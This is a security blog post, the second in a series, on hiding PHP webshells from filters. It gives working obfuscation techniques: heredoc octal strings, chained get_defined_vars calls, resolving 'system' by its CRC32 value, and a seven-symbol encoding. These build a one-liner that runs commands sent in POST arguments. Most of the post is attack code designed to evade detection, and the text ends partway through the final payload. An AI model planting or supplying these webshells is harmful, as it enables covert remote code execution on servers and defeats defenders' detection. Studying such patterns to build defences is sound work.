---
layout: posts
title:  Hidden in plain sight - Part 2
date:   2023-11-05
categories: stuff
---

A few days ago, I published a blog post about PHP webshells, ending with a discussion about filters evasion by getting rid of the pattern `$_`. The latter is commonly used while extracting data submitted by the user, through the variables `$_GET` or `$_POST`. I presented the following five techniques, retrieving POST'ed argument, being a bash command to be executed by `system`.

_The latter could also be dynamically retrieved thanks to a [variable function](https://www.php.net/manual/en/functions.variable-functions.php)_ 

```php
//technique 1
echo system(filter_input(0, 'A'));
//technique 2
echo system(${"_"."POST"}["B"]);
//technique 3
echo system(file_get_contents("php://input"));
//technique 4
echo system(get_defined_vars()[array_keys(get_defined_vars())[1]]["C"]);
//technique 5
$x = '_'.'POST';
echo system($$x['D']);
```

However, my favourite webshell is something like `$_GET['a']($_GET['b'])` because it makes it possible to call any function that takes a single argument (string, array or null). However, as stated in the documentation:

>
>Variable functions won't work with language constructs such as echo, print, unset(), isset(), empty(), include, require and the like
>

and for some others, they cannot be dynamically called:

```php
var_dump("get_def"."ined_vars"()); //okay
var_dump(("get_defin"."ed_vars")()); //also okay
$x="get_defined_vars"; var_dump($x()); //not okay
var_dump(($x="get_defined_vars")()); //also not okay
```

_NOTE: `eval` cannot be used as variable function, since it is a language construct and not a true function_

However, PHP is really (REALLY) permissive, and it's quite easy to call most of the functions while hiding their name. Let's discuss four techniques with their own peculiarities, executing something like:

```php
$_GET['a']($_GET['b']);
```

## Technique #1: No letters, no quotes

This first technique gets rid of quotes and letters, but using [_heredocs_ strings](https://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc).

As the doc says:

>
>A third way to delimit strings is the heredoc syntax: <<<. After this operator, an identifier is provided, then a newline. The string itself follows, and then the same identifier again to close the quotation.
>

Heredocs makes it possible to create multiline strings, such as:

```php
$var = <<<_
Hello world
_;
```

In this case, the _identifier_ is a simple underscore symbol. Note that the new lines after the first marker and before the second one are not part of the string. It means that `echo "*$var/";` would print `*Hello world/`.

Compared to _nowdocs_, _heredocs_ are like double-quoted strings, which means that it interprets escaping sequences and performs string interpolation. Therefore, the following snippet of code would set the variable `$x` equal to the character `'a'`, written here is octal:

```php
$x = <<<_
\141
_;
```

Variable functions can therefore be created:

```php
$filter_input = <<<_
\146\151\154\164\145\162\137\151\156\160\165\164
_;
```

and therefore, calling `filter_input(0, 'a')(filter_input(0, 'b'))` would be done as follows:

```php
(<<<_
\146\151\154\164\145\162\137\151\156\160\165\164
_)(0, <<<_
\141
_)((<<<_
\146\151\154\164\145\162\137\151\156\160\165\164
_)(0, <<<_
\142
_));
```

_NOTE: enclosing heredoc strings between parentheses seems to be mandatory, a syntax error would be raised otherwise._

### Variant with letters

Since heredoc strings perform string interpolation, the symbols can be resolved within the string:

```php
$x = <<<_
    {${$_POST[0]($_POST[1])}}
_;
```

Or:

```php
$x = <<<_
    {${${chr(95).chr(80).chr(79).chr(83).chr(84)}[0](${chr(95).chr(80).chr(79).chr(83).chr(84)}[1])}}
_;
```

## Technique #2: One-liner with only two functions

This is an extension of the fourth technique using `get_defined_vars` and `array_keys`, by chaining them in order to dynamically resolve the function name and its argument. Let's first print the result of get_defined_vars()` (no other variables declared):

```
Array
(
    [_GET] => Array
        (
        )

    [_POST] => Array
        (
            [a] => system
            [b] => id
        )

    [_COOKIE] => Array
        (
        )

    [_FILES] => Array
        (
        )
)
```

The routine `array_keys` can be used to retrieve the first level of this 2D-array:
```
Array
(
    [0] => _GET
    [1] => _POST
    [2] => _COOKIE
    [3] => _FILES
)
```

To execute the expected payload, one should have something like:

```php
$post_key = array_keys(get_defined_vars())[1]; //get 2nd key
$post_data = get_defined_vars()[$post_key]; //['a' => 'system', 'b' => 'id']
$post_data_keys = array_keys($post_data); // ['a', 'b']
$system = $post_data[$post_data_keys[0]]; //['a' => 'system', 'b' => 'id'][['a','b'][0]] = 'system'
$id = $post_data[$post_data_keys[1]]; //same at index 1
$system($id);
```

Let's replace all local variables with function calls:

```php
get_defined_vars()[array_keys(get_defined_vars())[1]][array_keys(get_defined_vars()[array_keys(get_defined_vars())[1]])[0]](get_defined_vars()[array_keys(get_defined_vars())[1]][array_keys(get_defined_vars()[array_keys(get_defined_vars())[1]])[1]]);
```

## Technique #3: F*** the `system`

The routine `get_defined_vars` is handy, but it has a drawback: it cannot be used as a variable function, making it more difficult to hide. This third technique resolves function names without hardcoding them nor passing them as argument, and uses functions that do not suffer from the same restriction. The idea is quite simple: the list of defined functions is filtered with `array_filter` and a submitted criterion. The matching name is dynamically called, while forwarding the second POST'ed argument.

To begin with, the list of existing routines can be obtained as follows (snipped for brevity):

```
Array
(
    [internal] => Array
        (
            [0] => zend_version
            [1] => func_num_args
            [2] => func_get_arg
            ...
        )
    [user] => Array
        (
        )
)
```

The first element of this two-dimensional array (labelled as _internal_) contains the list of existing functions (i.e. not user-defined). A first approach could be to locate the index of `system` and hardcode its key, but the latter could change, depending on the PHP configuration (loaded modules, disabled functions, etc.), making this approach quite unstable. To make it more configuration-independent, this array could be filtered with a lambda function and the routine [_array\_filter_](https://www.php.net/manual/en/function.array-filter.php);

>
>Iterates over each value in the array passing them to the callback function. If the callback function returns true, the current value from array is returned into the result array.
>
>Array keys are preserved, and may result in gaps if the array was indexed. The result array can be reindexed using the array_values() function.
>

To isolate the expected routine, we chose to filter on the CRC32 value (collisions may exist, though):
```php
var_dump(array_filter(reset(get_defined_functions()), fn($x) => crc32($x) == $_POST[chr(0x61)]));
```

The `reset` function is used here because `get_defined_functions` returns a 2D array, and we are interested only by `get_defined_functions()["internal"]` (the first element). Each element is then passed to `crc32`, which appends to its return value all the matching items. If no collision exists, it should contain a single element. Sending _a=3377271179_ in the POST'ed body would return `system`:

```
array(1) {
  [683]=>
  string(6) "system"
}
```

The result is a named array, hence `reset` can be used once again to keep only `system` name:

```php
$sys = reset(array_filter(reset(get_defined_functions()), fn($x) => crc32($x) == $_POST[chr(0x61)]));
```

One can now call the routine dynamically, passing the 2nd POST'ed argument:

```php
reset(array_filter(reset(get_defined_functions()), fn($x) => crc32($x) == $_POST[chr(0x61)]))($_POST[chr(0x62)]);
```

_NOTE: this technique can obviously be combined to others in order to hide the $\_POST._

## Technique #4: Only 7 characters

Ever heard about [BrainF\*ck](https://esolangs.org/wiki/Brainfuck) ? This esoteric programming language made only of the symbols `><+-.,[]` is more like a joke than a usable language. Alternatives have been created, such as the infamous [JSF\*ck](https://jsfuck.com/), made only of six characters (`()+[]!`). A [PHPf*ck](https://splitline.github.io/PHPFuck/) was also created, using only seven symbols `([+.^])`, but the latter is not compatible with PHP 8 (and later). An [alternative](https://b-viguier.github.io/PhpFk/) exists for PHP 8, but it uses [Foreign Function Interface](https://www.php.net/manual/en/book.ffi.php), that is not always installed. Moreover, PHP8 makes it harder to execute code from string, since `eval` cannot be called as a variable function, `assert` does not evaluate any more the passed argument, `preg_replace`'s `/e` flag is deprecated, and `create_function` too.

_I'm also aware that a version only uses 5 characters ([mystiz.hk/posts/2021/2021-08-10-uiuctf-phpfuck/](https://mystiz.hk/posts/2021/2021-08-10-uiuctf-phpfuck/)), but I wanted to do it without letters nor numbers. Still, their technique is really clever._

However, the goal here was not to `eval`uate something arbitrary, but to execute `$_GET['A']($_GET['r])` (you will understand why 'A' and 'r', and not 'a' and 'b'). I therefore had to find a way to call the routine [`filter_input_array`](https://www.php.net/manual/en/function.filter-input-array.php) to extract submitted data:

>
>filter_input_array(int $type, array|int $options = FILTER_DEFAULT, bool $add_empty = true): array|false|null
>
>This function is useful for retrieving many values without repetitively calling filter_input().
>

Fortunately, this routine only takes one argument, saving me the need to use the comma symbol. This first argument is supposed to be an integer:
* 0: `INPUT_POST`;
* 1: `INPUT_GET` ;
* 2: `INPUT_COOKIE` ;
* 3: undefined
* 4: `INPUT_ENV` ;
* 5: `INPUT_SERVER`.

Therefore, the not-so-obfuscated code should be as follows:

```php
filter_input_array(0)["A"](filter_input_array(0)["r"]);
```

### Building strings
The principle for JSF\*ck or PHPf\*ck is to build arbitrary strings to dynamically call variable functions, **without using any letter or number**. To do so, some primitives are obtained, and from this limited charset, other characters are computed. The primitive values are as follows:

```
[]     : can be translated to 'Array' if concatenated
![]    : true / 1
!![]   : false / empty string (similar to 0)
![]^![]: 0 / false
```

_The difference between the two last elements is that the 3rd one is similar to `false` and an empty string, while the 4th one could also be represented as the string `'0'`_

From these primitives, we can extract a charset. For instance, we can obtain the `'A'` by extracting the first letter of the string `'Array'`. However, the array must first be concatenated to `1` or another array to be considered as a string:

```php
$x = ([].![]); // 'Array1'
$y = !![]; //false
$A = $x[$y]; // 'Array1'[0]
```

Therefore, the letter `'A'` can be obtained with `([].![])[!![]]`. Similarly, the letter `'r'` can be obtained by doing the same at index 1: `([].![])[![]]`.

Since `!![]` and `![]` are boolean/integers, being allowed to use the `'+'` symbol would significantly ease the process. The number 2 could be obtained with `![]+![]`, 3 with `![]+![]+![]` and so on. Only numbers from 0 to 9 are sufficient to build any number, because it is possible to _concatenate_ digits and turn them into numbers:

```php
$a = (![].[])[!![]]; //'1', because it's '1Array'[0]
$b = ((![]^![]).[])[!![]]; // '0', because it's '0Array'[0]
$c = (![]^![])+(((![].[])[!![]]).(((![]^![]).[])[!![]])); // int(10)
//because it's the same as:
$c = (0 + '1'.'0'); 
```

Since the expression _adds_ an integer and a string, the result is considered as a number with an implicit cast from string to integer. Another interesting thing is that an index expressed as a string would also be turned into an integer if such a value is expected and if possible. For instance:

```php
echo "abcd"["X"]; // fails
echo "abcd"["2"]; // prints 'c'
echo "abcd"[2];   // also prints 'c'
```

However, we decided to not use the `'+'` symbol since it would be too easy, and to use only the numbers _0_ and _1_. To extract the letters `'a'` and `'y'` from `'Array'`, we therefore used a trick to extract the 12th character (index 11) of the string `'111ArrayArray'`:

```php
print_r((![].![].![].[].[])[!(![]^![]).(![]^!![])]); // 'a'
//because it's the same as te following lines
print_r(('1'.'1'.'1'.'Array'.'Array')[!(1^1).(1^0)]);
print_r(('111ArrayArray')[(!0).(1)]);
print_r(('111ArrayArray')['1'.'1']);
print_r(('111ArrayArray')[11]);
```

Regarding the `'y'`, the principle is the same, but with a `![]` less at the beginning: `(![].![].[].[])[!(![]^![]).(![]^!![])]`.

So far, the charset is as follows:

```
'A': 1000001: ([].![])[!![]]
'r': 1110010: ([].![])[![]]
'a': 1100001: (![].![].![].[].[])[!(![]^![]).(![]^!![])]
'y': 1111001: (![].![].[].[])[!(![]^![]).(![]^!![])]
'1': 0110001: ![].[][!![]]
'0': 0110000: (![]^![]).[][!![]]
```
### Here comes the XOR

PHP also allows different types to be XORed against each other:

```php
print_r(1 ^ 2);     // 3
print_r(1 ^ '2');   // 3
print_r(1 ^ 'A');   // fails, because 'A' cannot be cast
print_r('1' ^ 'A'); // p, because ASCII codes are XOR'ed
```

By doing magic with the available characters in the set, it is possible to obtain other letters:

```
'q': 1110001: '0' XOR 'A': (![]^![]).[][!![]] ^ ([].![])[!![]]
'B': 1000010: '0' XOR 'r': (![]^![]).[][!![]] ^ ([].[])[![]]
'Q': 1010001: '0' XOR 'a': (![]^![]).[][!![]] ^ (![].![].![].[].[])[!(![]^![]).(![]^!![])]
'I': 1001001: '0' XOR 'y': (![]^![]).[][!![]] ^ (![].![].[].[])[!(![]^![]).(![]^!![])]
'p': 1110000: '1' XOR 'A': ![].[][!![]] ^ ([].![])[!![]]
'C': 1000011: '1' XOR 'r': ![].[][!![]] ^ ([].![])[![]]
'P': 1010000: '1' XOR 'a': ![].[][!![]] ^ (![].![].![].[].[])[!(![]^![]).(![]^!![])]
'H': 1001000: '1' XOR 'y': ![].[][!![]] ^ (![].![].[].[])[!(![]^![]).(![]^!![])]
```

The charset we have now is still too small to be able to obtain any character. We can realise that by taking a look at the binary codes of the obtained characters. None of them has its 5th bit set, which means that the XOR operation between them will always leave it cleared. Although it is possible to obtain more characters by XORing more than two operands, the 5th bit is annoying.

Finding a suitable character having this bit set was quite challenging. A first idea way to obtain it through the value `INF`:

```php
var_dump(![]+((![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![]).(![])).[]);
//output: string(8) "INFArray"
```

This string starts with `![]` to first consider the value as a number. Then, 309 `(![])` are appended to build the number 11...1, translated into the value `float(INF)` (having only 308 times this pattern would give `float(1.1111111111111112E+308)`). Once this `INF` is obtained, it is concatenated with `[]` to turn it back into a string: `'INFArray'`. Accessing the second letter (`'N'`) would be useful since its ASCII code is `78 = 0b1001110`.

However, this payload seemed a bit too big (it is only to get an intermediary variable in order to obtain a single character ...), hence we decided to look for another approach.

## The answer to everything

The legend says that _THE ANSWER_ is in the digits of Pi, and indeed, that was my way to go. The [`pi` routine](https://www.php.net/manual/en/function.pi.php) returns the number `3.1415926535898`. Casting this value as a string would make us able to extract the dot (`'.'`) at index 1. Although such technique could work, we used another one, by using the `'4'` instead. This character is at index 3, and we could access it by calling `(pi().[])[pi()]`. The float value would be treated as an integer while acting as an index, indeed returning `(pi().'Array')[3] = '4'`:

```php
print_r((((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]); // '4'
//because it is the same as:
print_r(('pi'().'Array')['pi'()]);
print_r('3.1415926535898Array'[3]);
```

Once this value is obtained, the other digits can be computed, and translated as follows:

```
'0': 0110000 (![]^![]).[][!![]]
'1': 0110001 ![].[][!![]]
'2': 0110010 ([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]
'3': 0110011 ([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]
'4': 0110100 (((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]
'5': 0110101 ([].[])[![]]^(![]^![]).[][!![]] ^ ([].[])[!![]]^(![]^![]).[][!![]] ^ ([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]] ^ (((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]
'6': 0110110 ([].[])[![]]^(![]^![]).[][!![]] ^ ([].[])[!![]]^(![]^![]).[][!![]] ^ ![].[][!![]] ^ (((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]
'7': 0110111 ([].[])[![]]^(![]^![]).[][!![]] ^ ([].[])[!![]]^(![]^![]).[][!![]] ^ (![]^![]).[][!![]] ^ (((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]
'8': 0111000 ([].![])[!![]] ^ (![].![].[].[])[!(![]^![]).(![]^!![])]
'9': 0111001 ([].![])[!![]] ^ (![].![].[].[])[!(![]^![]).(![]^!![])] ^ (![]^![]).[][!![]] ^ ![].[][!![]]
```

## Building the final payload

As stated earlier, the final payload should do something like:
```php
filter_input_array(0)["A"](filter_input_array(0)["r"]);
//same as
filter_input_array(!![])["A"](filter_input_array(!![])["r"]);
//same as
filter_input_array(0)[([].![])[!![]]](filter_input_array(0)[([].![])[![]]]);
```

Since the strings `'A'` and `'r'` are part of the restricted charset, it is easier to use them as POST arguments. Last step is then to rebuild `filter_input_array`. The missing characters are:

```
f: '4'^'r':         (((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^([].![])[![]]
i: '0'^'y':         (![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]
l: '5'^'y':         ([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].[].[])[!(![]^![]).(![]^!![])]
t: '5'^'a':         ([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]
e: '7'^'r':         ([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^([].![])[![]]
_: 'r'^'5'^'y'^'a': ([].![])[![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].[].[])[!(![]^![]).(![]^!![])]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]
n: '7'^'y':         ([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].[].[])[!(![]^![]).(![]^!![])]
p: '1'^'a':         ![].[][!![]]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]
u: '4'^'a':         (((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^ (![].![].![].[].[])[!(![]^![]).(![]^!![])]
```

Note that the final `'array'` in the function name can only be replaced by `[]`, since PHP does not care about the case, and writing `fIlTer_iNpuT_Array` should be perfectly fine (same as `"filter_input_".[]`). Each letter is put between parentheses, and the final payload is as follows:

```
(((((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^([].![])[![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]).(([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].[].[])[!(![]^![]).(![]^!![])]).(([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]).(([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^([].![])[![]]).(([].![])[![]]).(([].![])[![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].[].[])[!(![]^![]).(![]^!![])]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]).(([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].[].[])[!(![]^![]).(![]^!![])]).(![].[][!![]]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]).((((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]).(([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]).(([].![])[![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].[].[])[!(![]^![]).(![]^!![])]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]).([]))(!![])[([].![])[!![]]]((((((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^([].![])[![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]).(([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].[].[])[!(![]^![]).(![]^!![])]).(([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]).(([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^([].![])[![]]).(([].![])[![]]).(([].![])[![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^![].[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].[].[])[!(![]^![]).(![]^!![])]^(![].![].![].[].[])[!(![]^![]).(![]^!![])]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]).(([].[])[![]]^(![]^![]).[][!![]]^([].[])[!![]]^(![]^![]).[][!![]]^(![]^![]).[][!![]]^(((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))().[])[((([].![])[!![]]^![].[][!![]]).((![]^![]).[][!![]]^(![].![].[].[])[!(![]^![]).(![]^!![])]))()]^(![].![].[].[])[!(![]^![]).(![]^!![])]).(![].[][!![]]^(![].![].![].[].[])[!(![]^![]).(![]^!